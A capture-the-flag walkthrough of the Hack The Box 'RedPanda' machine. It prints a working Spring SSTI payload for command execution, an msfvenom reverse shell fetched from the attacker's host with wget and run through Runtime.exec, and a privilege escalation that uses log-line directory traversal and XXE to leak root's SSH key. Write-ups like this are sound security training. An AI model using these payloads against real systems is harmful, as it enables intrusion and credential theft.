# redpanda-htb-walkthrough
<h3> About the Lab:</h3>
This is a Linux machine that requires exploiting SSTI in a Java SpringFramework application via a search bar on the webpage for RCE and then initial access. For privilege escalation, we will need to emulate what group the user is in, discover a log file he/she has access to, use pspy to discover a JAR file root periodically run, study that JAR file to discover conditions required to pass, exploiting directory traversal, and generate an XXE XML file to leak root’s SSH private key. The privilege escalation for this machine is HARD and shouldn’t be an easy category machine. But let’s get started!

## User Own:
Connect VPN first: `sudo openvpn [your.ovpn file]`<br>
First thing first, run nmap scan on the RedPanda server: `nmap -sS -A -p- -T4 [machine-ip]`<br>
**From nmap Enumeration:**<br>
**port 22**: SSH service<br>
**port 8080**: Red Panda Search (powered by Spring Boot)

We run some other tools as well to gather as much information possible to find out existing vulnerability in the system:<br>
`dirb [url] [wordlist]`<br>
`curl -v [url]`

![image](https://user-images.githubusercontent.com/31168741/203845250-2f90a1ca-396f-4546-865d-623841800910.png)
![image](https://user-images.githubusercontent.com/31168741/203845289-5f991ccb-a71c-4c2f-bcca-2ee00a747d45.png)

From above, we find out it is built in Spring framework Java. We found 3 accessible directories as well. Browse the website manually and inspect each endpoint with Burp Suite. If no input is provided, the search endpoint returns:

![empty_input](https://user-images.githubusercontent.com/31168741/203846234-ac32fa99-1973-4490-bb19-b6b760866f3b.png)

The stats provides some statistics for 2 different authors:<br>
**woodenk**<br>
**damian**<br>
and an export function, which generates a report for each specific user.

![stats_author_woodenk](https://user-images.githubusercontent.com/31168741/203846805-89cb2072-f645-401e-a253-dcbcac02bbfd.png)

Other than that, we've tested for various injections (SQL Injection, XXE Injection) etc. and turns out there is an SSTI injection within the search function, but some characters are blacklisted.<br>

<h3>So what is an SSTI Injection?</h3>
A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. For further information: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection<br>

A list of payloads that can be used for checking if the site is vulnerable to SSTI:

![Capture](https://user-images.githubusercontent.com/31168741/203847710-53ca4cb6-033e-440b-a85a-a952488b2f34.PNG)

4 of the payloads didn't work since some of the symbols are blacklisted by the server.

>**Error occured: banned characters**<br>

Oddly enough, the # (pound) symbol and * (star) have done the work and we can confirm the SSTI.

![ssti_confirmed](https://user-images.githubusercontent.com/31168741/203847928-026c15c3-ab62-415e-a887-7bc63588aabf.png)
![image](https://user-images.githubusercontent.com/31168741/203847951-a3bd0348-beee-42fe-98e0-7061a58dc19d.png)

Both mathematical operations 1+3+3+7 and 7+7 equals 14 we can tell that the payload got executed by the server, since we see the expected output.

<h3>SSTI into RCE:</h3>
The nmap scan reveals that the web application is powered by Spring Boot – so is it a Java application. Let's verify our payload by reading /etc/passwd. Use [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)'s Template Injection cheat sheet and find a suitable payload that bypasses the blacklist filter.<br>
Hint: The payload won't work, unless we change the $ (dollar sign) to an * (asterisk).<br>

`${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}`

![image-1](https://user-images.githubusercontent.com/31168741/204106233-2b022041-c1d7-4155-86ab-91b8e5f3eacc.png)

<h3>Reverse Shell</h3>
Note: pentest.ws (Helps to create a reverse shell)
The shell:<br>
msfvenom -p linux/x64/shell_reverse_tcp LHOST=[your-machine-ip] LPORT=1234 -f elf > rs.elf<br>
Start your HTTP server in the same location as r.elf the reverse shell to the target machine: python3 -m http.server 80. Now the payload we'll use here is: *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("")}; as it is java based (collected from github). Now intercept the get request from searchbar and put the payload in the value section accordingly:<br>
To transfer the payload to the target machine:<br>
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget [your-machine-ip]/rs.elf")}<br>
To change the permission:<br>
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./rs.elf")}<br>
Now we execute but before that, do not forget to generate a listener:<br>
nc -lvnp 1234<br>
Execute: *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./rs.elf")}<br>
Upgrading to the tty shell so that we can get a better view to follow: python3 -c 'import pty; pty.spawn("/bin/bash")'

![image](https://user-images.githubusercontent.com/31168741/204106736-02c77520-4e37-43a1-89ce-8383d18f52fc.png)

In the server yay! Pass for user Woodenk is found under the directory:<br>
>/home/woodenk<br>
>user.txt

## System Own:
<h3>Privilege Escalation</h3>
We run pspy64(snoop unpriviledged Linux processes) to observe. We notice a JAR file is being executed by root within a time interval.<br>
**woodenk@redpanda:/home/woodenk$** `cd /tmp`<br>
**woodenk@redpanda:/tmp$** `wget 10.10.16.9/pspy64` (Change the ip with your localhost)<br>
**woodenk@redpanda:/tmp$** `chmod +x ./pspy64`<br>
**woodenk@redpanda:/tmp$** `./pspy64`<br>

![image-25](https://user-images.githubusercontent.com/31168741/204232264-1a76f509-48c9-4f65-bdb2-23c479653fcd.png)

We host an HTTP server at port 8000 in /opt/credit-score/LogParser/final/target/ and download the file. Opening the JAR file using jd-gui, it appears that **/opt/panda_search/redpanda.log** is being read in main().

![image-26](https://user-images.githubusercontent.com/31168741/204232850-b2bd1377-acd0-4ff0-881f-7aa4fbcac886.png)

According to the code, there are a few conditions to pass:<br>
•	The line must contain “.jpg” in the string<br>
•	split() will be done to the string where “||” is the delimiter.<br>
•	The string must be split into 4 strings:<br>
•	The first string must be a number.<br>
•	4th string must be pointing to an existing .jpg file.<br>
•	The .jpg file’s metadata tag “Artist” must have a value that matches to /credits/<author_name>_creds.xml.

<h3>Create a JPG file and add the author's name</h3>
• Since the current user does not have WRITE access to /credits, we set the “Artist” value to “../tmp/gg” where our XML exploit will be at /tmp/gg_credits.xml.
• JPG file should be in a folder where the current user has WRITE access. I used /tmp.
• Use ExifTool to add the Artist tag with the value “../tmp/gg”: `$exiftool -Artist="../tmp/gg" pe_exploit.jpg`<br>

![image](https://user-images.githubusercontent.com/31168741/204234748-65bf3ada-8707-4045-a606-67e107200337.png)

<h3>Create an XML file</h3>
•	We create an XML file following the structure of existing XML file on the victim’s machine.

![image](https://user-images.githubusercontent.com/31168741/204234971-ce3ad4c7-8022-4468-8b28-0330e23ae26a.png)

•	We transfer both files in the target machine and modify the log file:<br>
**woodenk@redpanda:/tmp$** `wget 10.10.16.9/pe_exploit.jpg -P /tmp`<br>
**woodenk@redpanda:/tmp$** `wget 10.10.16.9/gg_creds.xml -P /tmp`<br>
**woodenk@redpanda:/tmp$** `echo "222||a||a||/../../../../../../tmp/pe_exploit.jpg" > /opt/panda_search/redpanda.log`<br>

•	Wait for a few minutes and read gg_creds.xml. We should see foo’s value is now replaced with root’s private key.

![image](https://user-images.githubusercontent.com/31168741/204235403-b8dbb2cd-3139-48ca-9a85-741a5985cc45.png)

•	Store the private key in root.txt and change its permission before SSH into the victim’s machine as root using the private key.<br>
`$ chmod 600 ./root.txt`<br>
`$ ssh root@10.10.11.170 -i root.txt`<br>

![image](https://user-images.githubusercontent.com/31168741/204235635-2fcbc084-29d1-4951-a171-b43fce2d3698.png)

•	We find root flag in root.txt.

![image](https://user-images.githubusercontent.com/31168741/204235760-36a7593a-f1a1-4b53-95d4-fa6f7c778d88.png)

Solved!






